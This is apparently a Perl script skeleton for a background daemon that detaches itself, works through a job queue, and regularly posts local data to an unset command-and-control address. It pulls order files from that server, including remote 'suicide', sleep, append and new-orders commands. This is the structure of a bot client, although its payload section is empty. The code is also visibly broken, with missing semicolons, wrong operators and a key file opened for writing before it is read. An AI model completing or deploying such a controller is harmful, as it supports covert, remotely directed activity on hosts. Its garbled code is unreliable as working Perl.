#!/usr/local/bin/perl
use strict; use warnings;
use Proc::Daemon;
use LWP::UserAgent;
use IO::Socket;
###############
# SUMMON SCROLL
###############
# NAME - purpose
# EMBRYO ##############################
my $name = ''; my $cc = '';
my $DONE = 'DONE'; my $dump = 'dump';
my $FACE = 'FACE'; open($Ffh, '>', $FACE) or die "FACE FAIL\n"
my $home = '/home/hive/$name'; my $HOLE = 'HOLE';
my $BUG = 'BUG'; my $LOG = 'LOG';
my $PID = 'PID'; my $que = 'que';
my $POST = 'POST'; my $WORD = 'WORD';
my $SLEEP  = 'SLEEP'; my $SUICIDE = 'SUICIDE';
my $RATE = '100'; my $KEYS = 'KEYS';
mkdir $home or die "home FAIL\n"; mkdir $que or die "que FAIL\n";
mkdir $dump or die "dump FAIL\n";
# BIRTH ###############################
my $embryo = Proc::Daemon->new(
  work_dir => $home,
  child_STDOUT = "+>>$LOG",
  child_STDERR = "+>>$BUG",
  child_STDIN = $HOLE,
  pid_file = $PID
);
$embryo->Init() or die "STILLBORN\n";
# INHERIT ############################
my $btime = TIME(); print "HELLOWORLD $btime\n";
# LIVE ###############################
while (1)
{
  @ls = `ls que`; my $QUE = @ls[0];
  open($qfh, '<', "que/$QUE");
  my @QUE = readline $qfh; chomp @QUE;
  close $qfh; unlink $QUE;
  unless (defined $QUE[1])
    { sleep 3600; }
  my $stime = TIME(); print "start $stime\n";
  my $variable = shift; print "variable $variable\n";
  my $count = @QUE; print "count $count\n";
  foreach my $i (@QUE)
  {
    if (-e $SUICIDE)
      { SUICIDE(); }
    if (-e $SLEEP)
      { SLEEP(); }
    print "started $i\n";
#######################################################################
## CODE #############################

#######################################################################
## CLEAN ############################
    shift @QUE; $count--;
    print "ended $i\n"; print "count $count\n";
    if ($count % $RATE == 0)
    {
# RATE ##############################
      POST($FACE); POST($variable);
      WORD();
    }
  }
  my $dtime = TIME(); print "done $dtime\n";
  open($Wfh, '>', $DONE);
  POST();
  WORD(); Wread();
}
# SUB ##############################
sub SUICIDE()
{
  unlink $SUICIDE;
  my $xtime = TIME(); print "FKTHEWORLD $xtime\n";
  exit;
}
sub SLEEP()
{
  open(my $Sfh, '<', $SLEEP);
  my $timeout = readline $Sfh; chomp $timeout;
  my $ztime = TIME(); print "sleep $ztime $timeout\n";
  close $Sfh; unlink $SLEEP;
  sleep $timeout;
}
sub TIME()
{
  my $t = localtime;
  my $m = split(/\s+/, $t)[1]; my $d = split(/\s+/, $t)[2];
  my $H = split(/\s+/, $t)[3]; my $h = split(/\:/, $H)[0];
  my $time = $m . '_' . $d . '_' . $h;
  return $time;
}
sub POST()
{
  my $data = shift; my $key = popkrip();
  my $ua = useragent();
  my $req = HTTP::Request->new(POST => $cc/$key)
  $req->content($data);
  print "response ";
  print $ua->request($req)->as_string;
  print "\n";
}
sub WORD()
{
  my $key = popkrip(); my $ua = useragent();
  my $res = $ua->get("$cc/i/$key", ':content_file'=>$WORD);
}
sub Wread()
{
  my $key = shift;
  open($Rfh, '<', "$dump/$key");
  my @cmds = readline $Rfh; chomp @cmds; close $Rfh;
  my $cmd = @cmds[0]; my $value = @cmds[1];
# (suicide, $boolean) (sleep, $x) (append, $key) (orders, $key)
  if ($cmd == 'suicide')
    { SUICIDE(); }
  if ($cmd == 'sleep')
    { open($Sfh, '>', $SLEEP); print "$Sfh" "$value"; close $Sfh; SLEEP(); }
  if ($cmd == 'append')
  {
    open(my $Wfh, '<', $WORD);
    my @aQUE = readline $Wfh;
    chomp @aQUE; close $Wfh;
    foreach (@aQUE)
      { push @QUE, $_; }
  }
  if ($cmd == 'orders')
    { cp $WORD que/$value; }
}
sub popkrip()
{
  open($Kfh, '>', $KEYS);
  my @list = readline $Kfh; chomp @list;
  my $key = shift @list; print $Kfh @list;
  close $Kfh; return $key;
}
sub useragent()
{
  my $ua = LWP::UserAgent->new(
# AGENT ##########################
  );
  return $ua;
}
